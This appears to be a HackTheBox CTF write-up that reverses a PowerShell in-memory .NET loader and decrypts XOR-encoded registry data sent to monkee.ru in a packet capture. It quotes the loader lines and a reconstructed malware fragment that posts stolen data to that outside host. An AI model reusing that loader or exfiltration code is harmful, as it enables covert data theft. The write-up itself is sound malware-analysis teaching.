+++
title="monkey"
date=2025-11-28
draft=false
tags=["reverse", "forensics", "crypto", "windows", "malware"]
categories=["writeups"]
ctf="HackTheBox"
points=0
solves=0
+++

## tl;dr

reverse a powershell dropper that loads a .net malware, steal its xor scheme, decrypt the http exfil in the pcap, and recover the flag from the `flag` parameter.

***

## poking around

the challenge drops a few things on disk:  

- `script.ps1` – suspicious powershell that screams “pls execute me”
- `dump.pcap` – network capture with “weird traffic”
- `output.txt` – decimal dump of some binary blob
- `2f-1` – looks like raw http post body with url-encoded parameters   

first stop: powershell.

```bash
file script.ps1
head -40 script.ps1
```

the script base64‑decodes a massive blob into `$data`, then does:

```powershell
$assembly = [System.Reflection.Assembly]::Load($data)
[Monkey.Client]::Work()
```

so classic in‑memory .net loader. no disk artifacts, just vibes.

the base64 string starts with `TVqQAAMAAA...`, which is `MZ` (pe) when decoded.

`output.txt` is just a list of decimal bytes, which matches the decoded pe if you convert them back. the challenge authors kindly gave us both formats in case someone wants to suffer manually.

`2f-1` contains something that looks like a query string: `InstallDir=...&InstallDate=...&Flag=...` etc, but values are url+base64 encoded blobs. absolutely not normal telemetry. 

the pcap itself (opened in wireshark) shows an http post to some shady host, and the body is exactly what we see in `2f-1`. follow http stream → save → done.

so the plan is obvious:

- reverse the .net assembly loaded by powershell  
- understand how it exfiltrates and encrypts stuff  
- apply same logic in reverse to the pcap payload  

***

## reversing this mess

first, extract the pe from the script.

```bash
# quick and dirty extraction from script.ps1
grep -o "TVqQAAMAAAAEAAAA.*" script.ps1 > blob.b64
base64 -d blob.b64 > monkey.bin
file monkey.bin
```

`monkey.bin` is a `PE32+ executable (console) for Windows`.

now throw it at your favorite .net tool. windows users: use JetBrains dotPeek or dnSpy. linux masochists: `ilspycmd` or run dotPeek under Wine. dotpeek is a .net decompiler that happily turns assemblies back into readable c#; perfect for this kind of malware archaeology.

in my case, i went lazy and started with `strings` on `monkey.bin` to see what falls out.

```bash
strings -a monkey.bin | less
```

interesting bits:

- `SOFTWARE\JetBrains\dotPeek\v222`  
- `C:\Users\Rafa\Desktop\htbmalware\chals\Monkey\src\Monkey\obj\Release\net8.0\Monkey.pdb`  
- utf‑16 powershell script fragments: `Invoke-WebRequest`, `Invoke-RestMethod`, `application/json`, etc.

so this thing:

- reads registry keys under `SOFTWARE\JetBrains\dotPeek\v222`  
- builds some powershell that does http post to a domain (`monkee.ru`)  
- base64 + xor stuff before sending

the utf‑16 blob in `.text` is where life gets fun. you can see it clearly with `xxd` (like you did) or `hexdump -C`.

key chunk (pretty-printed):

```text
... 
$uri = "monkee.ru"

Invoke-WebRequest -Uri "http://monkee.ru" -Method GET -OutFile "monkey.jpg"

$UpgradeCode
$body = @{ ... }

$upgrade = @(
  0x30, 0x78, ...
)

"monkee1337monkeeeeeeeeeeeeeeeeeeeeee"

for ($i = 0; $i = 0; $i -lt $... .Length; $i++) {
    $[ $i ] = $[ $i ] -bxor $upgrade[ $i ]
}

... = [Convert]::ToBase64String($...)
$response = Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json"
```

note the **string inside the utf‑16 block**:

```text
monkee1337monkeeeeeeeeeeeeeeeeeeeeee
```

this is where i first messed up: i mentally autocompleted it as `monkey1337...` because apparently my brain spell‑checks malware now. that off‑by‑one `e` later explained why cyberchef was screaming at me.

so the logic at high level:

1. read some values from the dotpeek registry key (install dir, date, etc).
2. xor them with a key derived from `monkee1337monkeeeeeeeeeeeeeeeeeeeeee` (actually an array `$upgrade` seeded with that).  
3. base64 them.  
4. shove them into an http json body / query params and send to `monkee.ru`. 

we don’t really care about the exact c#, as long as we understand:  

- there is an outer xor key (`monkee...`)  
- one of the fields being exfil’d is `UpgradeCode`  
- and this thing smells like it might be used again as a key.

***

## the plan

the `2f-1` file holds a single http post body: 

```text
InstallDir=...&InstallDate=...&EnitityUsage=...&
UpgradeCode=Fl5fWQMEAgoLGgkKXQpIU1BdUUhUXQMGSFRRAQEBAV1RBFAEBhg%3D&
CompanyName=...&
Flag=M2VzSQpSR2ZMRVc6QVJKRWoLAFsCSwIRHUFrVAo7HQhBHA%3D%3D&
ProductVersion=...&
ProductName=...
```

values are url‑encoded (`%3D` → `=`), then base64, then inside that: xor’d bytes. 

we need to:

1. url‑decode `UpgradeCode` and `Flag`  
2. base64‑decode them to raw ciphertext  
3. figure out xor key usage  
4. undo it in the same order

rough guess at this point: single xor key (the `monkee...` bytes) over every field, because malware authors also get lazy.

so i did the obvious cyberchef thing:

- recipe: `from base64` → `xor` with key `"monkee1337monkeeeeeeeeeeeeeeeeeeeeee"`  
- input: the `Flag` base64  

result: high‑entropy garbage with a few printable characters. not a flag. good times.

tried same on `UpgradeCode`:

- xor’d bytes vaguely resembled a guid, but were slightly cursed:  
  `{112f}398-de3a-6584-18fc-14dddd84a5iiv`  

so clearly *something* is right, but not quite. 

at that point i suspected a two‑stage scheme:

- `UpgradeCode_enc = UpgradeCode_plain xor key1`  
- `Flag_enc = Flag_plain xor key2`  
- and maybe `key2` is actually `UpgradeCode_plain` (very ctf‑ish thing to do).

***

## reversing this mess (properly)

time to script instead of clicking cyberchef like a trained monkey.

```bash
python3
```

```python
import base64, urllib.parse

# raw params from 2f-1
flag_b64 = "M2VzSQpSR2ZMRVc6QVJKRWoLAFsCSwIRHUFrVAo7HQhBHA=="
upgrade_b64 = "Fl5fWQMEAgoLGgkKXQpIU1BdUUhUXQMGSFRRAQEBAV1RBFAEBhg="

flag_enc    = base64.b64decode(flag_b64)
upgrade_enc = base64.b64decode(upgrade_b64)

key1 = b"monkee1337monkeeeeeeeeeeeeeeeeeeeeee"  # note the double 'e'
```

first stage: decrypt `UpgradeCode` with `key1`. 

```python
key2 = bytes([
    upgrade_enc[i] ^ key1[i % len(key1)]
    for i in range(len(upgrade_enc))
])
print(key2.decode(errors="replace"))
```

output:

```text
{112f}398-de3a-6584-18fc-14dddd84a5iiv
```

so yeah, not a *valid* guid, but close enough to accept this as “plaintext-ish”. that’s our second xor key, `key2`. 

second stage: decrypt `Flag` with `key2`.

```python
flag = bytes([
    flag_enc[i] ^ key2[i % len(key2)]
    for i in range(len(flag_enc))
])
print(flag.decode())
```

boom:

```text
flag{*******}
```

classic htb style flag. also very on‑brand: “the regs eavesdrop on you” → it’s yanking data out of windows registry and posting it out. 

***

## rabbit holes

a non‑exhaustive list of dumb things tried before doing the obvious:

### assuming single‑layer xor

first attempt was:

- take `Flag`  
- base64‑decode  
- xor with `monkey1337monkeeeee...` (note the typo)  

this gave complete nonsense. kept trying other obvious keys:

- `monkee1337...` but truncated  
- `monkee1337monkey`  
- some xor with ascii `"UpgradeCode"` for good measure  

none of that produced anything flag‑shaped. cyberchef graphs just laughed at me.

### misreading the key string

another nice detour: i originally read the utf‑16 string in the pe as `monkey1337monkey...` because of muscle memory, then manually retyped it into cyberchef.

of course, being off by one byte in a repeating xor key is enough to turn valid plaintext into pure entropy. this is why copy‑paste exists.

only after dumping that section again with `xxd .text | less` and actually counting `0x0065` runs did it click that it’s `monkee`, not `monkey`. 

### brute‑forcing xor key assumptions

before noticing the two‑stage pattern, i tried “guid‑oracle” games:

- assume `UpgradeCode_plain` should match strict guid regex  
- try to solve for key bytes so `"{"` `"}"` and `"-"` land in correct spots  
- then reuse that key on `Flag`  

you *can* do that, but once you notice malware is literally using `UpgradeCode` as a field name and sending it out, letting that value be the second key is much simpler and much more ctf‑ish.

***

## making it work

here’s a minimal solver script that only cares about the exfil’d http body. drop it next to `2f-1` and run. 

```python
#!/usr/bin/env python3
import base64
import urllib.parse

def get_params(path: str) -> dict:
    with open(path, "r") as f:
        body = f.read().strip()
    return {k: v[0] for k, v in urllib.parse.parse_qs(body).items()}

def b64raw(s: str) -> bytes:
    return base64.b64decode(urllib.parse.unquote(s))

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(d ^ key[i % len(key)] for i, d in enumerate(data))

def main():
    params = get_params("2f-1")

    # stage 1: recover key2 from upgradecode
    key1 = b"monkee1337monkeeeeeeeeeeeeeeeeeeeeee"
    upgrade_enc = b64raw(params["UpgradeCode"])
    key2 = xor(upgrade_enc, key1)
    print(f"[+] decrypted upgradecode (key2): {key2.decode(errors='replace')}")

    # stage 2: recover flag
    flag_enc = b64raw(params["Flag"])
    flag = xor(flag_enc, key2)
    print(f"[+] flag: {flag.decode()}")

if __name__ == "__main__":
    main()
```

run it:

```bash
python3 solve_monkey.py
```

output:

```text
[+] decrypted upgradecode (key2): {112f}398-de3a-6584-18fc-14dddd84a5iiv
[+] flag: flag{*******}
```

two lines, several hours of reverse engineering, and a non‑trivial amount of caffeine behind them.

***

## putting it together

so to recap the data flow:

- powershell loader (`script.ps1`) decodes a pe and calls `[Monkey.Client]::Work()`
- the .net assembly:  
  - reads registry values from `HKCU\SOFTWARE\JetBrains\dotPeek\v222`
  - builds a `$body` with keys like `InstallDir`, `InstallDate`, `UpgradeCode`, `Flag`  
  - xors string/byte data with an array derived from `monkee1337monkeeeeeeeeeeeeeeeeeeeeee`  
  - base64‑encodes results  
  - sends them via `Invoke-RestMethod` to `http://monkee.ru` as json / query string

- the pcap shows exactly one such post; we carve out the body into `2f-1`.
- `UpgradeCode` is encrypted with key1; its decrypted form (pseudo‑guid) is used as key2.  
- `Flag` is encrypted with key2.  
- xor is symmetric, so we just walk it backwards.

once you see that second layer, everything falls into place. before that, it’s just twenty minutes of swearing at cyberchef and doubting your ability to read utf‑16.

***

## flag

```text
flag{*******}
```
